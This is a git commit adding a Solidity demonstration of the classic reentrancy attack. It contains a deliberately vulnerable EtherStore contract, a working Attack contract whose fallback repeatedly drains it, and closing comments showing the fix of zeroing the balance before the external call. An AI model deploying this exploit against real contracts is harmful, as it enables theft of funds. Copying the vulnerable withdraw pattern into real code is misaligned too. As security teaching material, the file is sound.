7a715548c2e6dabae1bb9150350467eadff1a2eb
Ihtisham Ullah <82340173+ihtisham-sudo@users.noreply.github.com>
2023-03-18 19:16:53 +0500

    Create ReentrancyAttack.sol

---
+++ ReentrancyAttack.sol
@@ -0,0 +1,76 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract EtherStore
+{
+    mapping (address => uint) public balances;
+
+    function deposit() public payable
+    {
+        balances[msg.sender] += msg.value;
+    }
+    function withdraw() public
+    {
+        uint bal = balances[msg.sender];
+        require(bal > 0, "Insuficient balance");
+        (bool sent,) = msg.sender.call{value: bal}("");
+        require(sent, "failed to send ether");
+        balances[msg.sender] = 0;
+    }
+    function getBalance() public view returns (uint)
+    {
+        return address(this). balance;
+    }
+}
+
+contract Attack
+{
+    EtherStore public etherstore;
+
+    constructor (address _etherStoreAddress) public
+    {
+        etherstore = EtherStore(_etherStoreAddress);
+    }
+
+    fallback() external payable
+    {
+        if(address(etherstore).balance >= 1 ether)
+        {
+            etherstore.withdraw();
+        }
+    }
+
+    function attack() external payable
+    {
+        require(msg.value >= 1 ether);
+        etherstore.deposit{value: 1 ether}();
+        etherstore.withdraw();
+    }
+    function getBalance() public view returns (uint)
+    {
+        return address(this). balance;
+    }
+
+}
+
+// Steps to prevent the reentrancy attack update the state variable before making external call to another contract.
+// Example (Exploited function)
+//      function withdraw() public
+    // {
+    //     uint bal = balances[msg.sender];
+    //     require(bal > 0, "Insuficient balance");
+    //     (bool sent,) = msg.sender.call{value: bal}("");
+    //     require(sent, "failed to send ether");
+    //     balances[msg.sender] = 0;
+    // }
+//Solution to prevent exploit
+//      function withdraw() public
+    // {
+    //     uint bal = balances[msg.sender];
+    //     require(bal > 0, "Insuficient balance");
+    //     balances[msg.sender] = 0;
+    //     (bool sent,) = msg.sender.call{value: bal}("");
+    //     require(sent, "failed to send ether");
+    // }
+ //Moved "Balances[msg.sender] = 0" under "require(bal > 0, "Insuficient balance");"
